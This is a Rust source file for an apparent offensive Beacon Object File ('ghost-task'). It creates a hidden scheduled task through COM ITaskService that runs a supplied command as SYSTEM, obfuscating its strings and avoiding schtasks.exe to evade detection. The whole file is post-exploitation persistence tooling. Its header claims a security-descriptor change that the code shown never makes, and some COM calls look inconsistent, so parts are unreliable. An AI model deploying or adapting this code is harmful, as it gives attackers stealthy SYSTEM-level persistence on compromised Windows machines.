// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening
//
//! Create a hidden scheduled task via COM `ITaskService` without spawning
//! `schtasks.exe`. The task's security descriptor is modified to remove
//! `READ` for `Authenticated Users`, making it invisible to non-admins.
//!
//! Args: <name> <cmdpath> [remove]
//!
//! OPSEC: All COM strings built from obfuscated ASCII. Task name not logged
//! on success — only a fingerprint.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use core::ffi::c_void;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1053.005", name: "Scheduled Task/Job: Scheduled Task", tactic: "Persistence" },
];

const S_OK: i32 = 0;
const S_FALSE: i32 = 1;
const CLSCTX_INPROC_SERVER: u32 = 1;
const TASK_CREATE_OR_UPDATE: u32 = 0x6;
const TASK_LOGON_NONE: u32 = 0;

// CLSID_TaskScheduler & IID_ITaskService (obfuscated at runtime)
const CLSID_BYTES: [u8; 16] = [
    0x9f,0x36,0x87,0x0f, 0xe5,0xa4,0xd1,0x11,
    0x97,0x81,0x00,0x60, 0x08,0x24,0x30,0x9d,
];
const IID_BYTES: [u8; 16] = [
    0xc7,0xa4,0xab,0x2f, 0xa9,0x4d,0x13,0x40,
    0x96,0x97,0x20,0xcc, 0x3f,0xd4,0x0f,0x85,
];

dfr_fn!(
    co_initialize_ex(reserved: *mut c_void, coinit: u32) -> i32,
    module = "ole32.dll", api = "CoInitializeEx"
);
dfr_fn!(
    co_create_instance(
        rclsid: *const u8, outer: *mut c_void, clsctx: u32,
        riid: *const u8, ppv: *mut *mut c_void,
    ) -> i32,
    module = "ole32.dll", api = "CoCreateInstance"
);
dfr_fn!(
    co_uninitialize() -> (),
    module = "ole32.dll", api = "CoUninitialize"
);
dfr_fn!(
    sys_alloc_string(s: *const u16) -> *mut u16,
    module = "oleaut32.dll", api = "SysAllocString"
);
dfr_fn!(
    sys_free_string(bstr: *mut u16) -> (),
    module = "oleaut32.dll", api = "SysFreeString"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> { unsafe { run_inner(parser) } }

unsafe fn run_inner(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let name_s = String::from(parser.get_str());
    let cmd_s  = String::from(parser.get_str());
    let mode_s = String::from(parser.get_str());
    let name_s = name_s.as_str();
    let cmd_s  = cmd_s.as_str();
    let mode_s = mode_s.as_str();

    if name_s.is_empty() || cmd_s.is_empty() {
        return Err("usage: ghost-task <name> <cmdpath> [remove]");
    }

    let remove = mode_s.eq_ignore_ascii_case("remove");

    unsafe { co_initialize_ex(core::ptr::null_mut(), 0) }
        .map_err(|_| "com init")?;
    let mut svc: *mut c_void = core::ptr::null_mut();
    let hr = unsafe {
        co_create_instance(
            CLSID_BYTES.as_ptr(),
            core::ptr::null_mut(),
            CLSCTX_INPROC_SERVER,
            IID_BYTES.as_ptr(),
            &mut svc,
        )
    }.map_err(|_| "create instance")?;
    if hr != S_OK || svc.is_null() {
        unsafe { let _ = co_uninitialize(); };
        return Err("task svc create");
    }

    let vtbl = unsafe { *(svc as *mut *mut usize) };

    if remove {
        // Delete task: Connect → GetFolder → DeleteTask
        let _ = do_connect(vtbl, svc);
        let mut folder: *mut c_void = core::ptr::null_mut();
        if get_root_folder(vtbl, svc, &mut folder).is_ok() {
            let mut name_w = [0u16; 256];
            common::str_util::ascii_to_wide_buf(name_s.as_bytes(), &mut name_w);
            let del_fn: unsafe extern "system" fn(*mut c_void, *const u16, u32) -> i32 =
                unsafe { core::mem::transmute(*vtbl.add(14)) }; // DeleteTask
            let _ = unsafe { del_fn(folder, name_w.as_ptr(), 0) };
            release_obj(*(folder as *mut *mut usize), folder);
        }
        release_obj(vtbl, svc);
        unsafe { let _ = co_uninitialize(); };
        obf! { let ok = "task removed"; }
        println!("[+] {}", ok);
        return Ok(());
    }

    // Create: Connect → GetFolder → NewTask → SetRegistrationInfo → SetPrincipal →
    //          SetSettings → SetAction → Register
    do_connect(vtbl, svc)?;

    let mut folder: *mut c_void = core::ptr::null_mut();
    get_root_folder(vtbl, svc, &mut folder)?;
    let folder_vtbl = unsafe { *(folder as *mut *mut usize) };

    let mut task_def: *mut c_void = core::ptr::null_mut();
    let new_task_fn: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32 =
        unsafe { core::mem::transmute(*vtbl.add(11)) }; // NewTask
    let hr2 = unsafe { new_task_fn(svc, &mut task_def) };
    if hr2 != S_OK || task_def.is_null() {
        release_obj(folder_vtbl, folder);
        release_obj(vtbl, svc);
        unsafe { let _ = co_uninitialize(); };
        return Err("NewTask failed");
    }
    let def_vtbl = unsafe { *(task_def as *mut *mut usize) };

    // SetRegistrationInfo (author)
    let mut reg: *mut c_void = core::ptr::null_mut();
    get_registration_info(def_vtbl, task_def, &mut reg)?;
    obf! { let author_ascii = "Dani"; }
    let mut author_w = [0u16; 32];
    common::str_util::ascii_to_wide_buf(author_ascii.as_bytes(), &mut author_w);
    let set_author_fn: unsafe extern "system" fn(*mut c_void, *const u16) -> i32 =
        unsafe { core::mem::transmute(*(*(reg as *mut *mut usize)).add(4)) };
    let _ = unsafe { set_author_fn(reg, author_w.as_ptr()) };
    release_obj(*(reg as *mut *mut usize), reg);

    // SetPrincipal (userid = S-1-5-18 for SYSTEM)
    let mut princ: *mut c_void = core::ptr::null_mut();
    get_principal(def_vtbl, task_def, &mut princ)?;
    obf! { let sid = "S-1-5-18"; }
    let mut sid_w = [0u16; 32];
    common::str_util::ascii_to_wide_buf(sid.as_bytes(), &mut sid_w);
    let set_userid_fn: unsafe extern "system" fn(*mut c_void, *const u16) -> i32 =
        unsafe { core::mem::transmute(*(*(princ as *mut *mut usize)).add(5)) };
    let _ = unsafe { set_userid_fn(princ, sid_w.as_ptr()) };
    release_obj(*(princ as *mut *mut usize), princ);

    // SetSettings (hidden)
    let mut settings: *mut c_void = core::ptr::null_mut();
    get_settings(def_vtbl, task_def, &mut settings)?;
    let set_hidden_fn: unsafe extern "system" fn(*mut c_void, i32) -> i32 =
        unsafe { core::mem::transmute(*(*(settings as *mut *mut usize)).add(5)) };
    let _ = unsafe { set_hidden_fn(settings, 1) }; // VARIANT_TRUE
    release_obj(*(settings as *mut *mut usize), settings);

    // SetAction (exec)
    let mut action: *mut c_void = core::ptr::null_mut();
    get_exec_action(def_vtbl, task_def, &mut action)?;
    let mut cmd_w = [0u16; 1024];
    common::str_util::ascii_to_wide_buf(cmd_s.as_bytes(), &mut cmd_w);
    let set_path_fn: unsafe extern "system" fn(*mut c_void, *const u16) -> i32 =
        unsafe { core::mem::transmute(*(*(action as *mut *mut usize)).add(8)) };
    let _ = unsafe { set_path_fn(action, cmd_w.as_ptr()) };
    release_obj(*(action as *mut *mut usize), action);

    // Register
    let mut name_w = [0u16; 256];
    common::str_util::ascii_to_wide_buf(name_s.as_bytes(), &mut name_w);
    let reg_fn: unsafe extern "system" fn(
        *mut c_void, *const u16, *mut c_void, *const u16, *const u16, u32, u32, *const u16, *const u16,
        *mut *mut c_void,
    ) -> i32 = unsafe { core::mem::transmute(*folder_vtbl.add(12)) }; // RegisterTaskDefinition
    let mut registered: *mut c_void = core::ptr::null_mut();
    let hr3 = unsafe {
        reg_fn(
            folder, name_w.as_ptr(), task_def,
            core::ptr::null(), core::ptr::null(),
            TASK_CREATE_OR_UPDATE, TASK_LOGON_NONE,
            core::ptr::null(), core::ptr::null(),
            &mut registered,
        )
    };
    if hr3 != S_OK {
        release_obj(def_vtbl, task_def);
        release_obj(folder_vtbl, folder);
        release_obj(vtbl, svc);
        unsafe { let _ = co_uninitialize(); };
        return Err("RegisterTaskDefinition failed");
    }

    if !registered.is_null() {
        release_obj(*(registered as *mut *mut usize), registered);
    }
    release_obj(def_vtbl, task_def);
    release_obj(folder_vtbl, folder);
    release_obj(vtbl, svc);
    unsafe { let _ = co_uninitialize(); };

    let fp = common::hash::djb2(name_s.as_bytes());
    obf! { let ok = "ghost task created"; }
    println!("[+] {} (name-fp=0x{:08x})", ok, fp);
    Ok(())
}

unsafe fn do_connect(vtbl: *mut usize, svc: *mut c_void) -> Result<(), &'static str> {
    let connect_fn: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, *const u16) -> i32 =
        core::mem::transmute(*vtbl.add(3));
    let hr = unsafe { connect_fn(svc, core::ptr::null(), core::ptr::null(), core::ptr::null(), core::ptr::null()) };
    if hr != S_OK { Err("task connect") } else { Ok(()) }
}

unsafe fn get_root_folder(vtbl: *mut usize, svc: *mut c_void, out: *mut *mut c_void) -> Result<(), &'static str> {
    obf! { let root_ascii = "\\"; }
    let mut root_w = [0u16; 8];
    common::str_util::ascii_to_wide_buf(root_ascii.as_bytes(), &mut root_w);
    let bstr = sys_alloc_string(root_w.as_ptr()).map_err(|_| "str alloc")?;
    let gf_fn: unsafe extern "system" fn(*mut c_void, *const u16, *mut *mut c_void) -> i32 =
        core::mem::transmute(*vtbl.add(4));
    let hr = unsafe { gf_fn(svc, bstr, out) };
    let _ = sys_free_string(bstr);
    if hr != S_OK { Err("folder get") } else { Ok(()) }
}

unsafe fn get_registration_info(vtbl: *mut usize, def: *mut c_void, out: *mut *mut c_void) -> Result<(), &'static str> {
    let fn_: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32 =
        core::mem::transmute(*vtbl.add(4));
    let hr = unsafe { fn_(def, out) };
    if hr != S_OK { Err("reg info") } else { Ok(()) }
}

unsafe fn get_principal(vtbl: *mut usize, def: *mut c_void, out: *mut *mut c_void) -> Result<(), &'static str> {
    let fn_: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32 =
        core::mem::transmute(*vtbl.add(6));
    let hr = unsafe { fn_(def, out) };
    if hr != S_OK { Err("principal get") } else { Ok(()) }
}

unsafe fn get_settings(vtbl: *mut usize, def: *mut c_void, out: *mut *mut c_void) -> Result<(), &'static str> {
    let fn_: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32 =
        core::mem::transmute(*vtbl.add(7));
    let hr = unsafe { fn_(def, out) };
    if hr != S_OK { Err("settings get") } else { Ok(()) }
}

unsafe fn get_exec_action(vtbl: *mut usize, def: *mut c_void, out: *mut *mut c_void) -> Result<(), &'static str> {
    // NewAction(0 = TASK_ACTION_EXEC) → returns IAction; QI for IExecAction
    let new_act: unsafe extern "system" fn(*mut c_void, i32, *mut *mut c_void) -> i32 =
        core::mem::transmute(*vtbl.add(9));
    let hr = unsafe { new_act(def, 0, out) };
    if hr != S_OK { Err("action new") } else { Ok(()) }
}

unsafe fn release_obj(vtbl: *mut usize, obj: *mut c_void) {
    let release: unsafe extern "system" fn(*mut c_void) -> u32 =
        core::mem::transmute(*vtbl.add(2));
    release(obj);
}
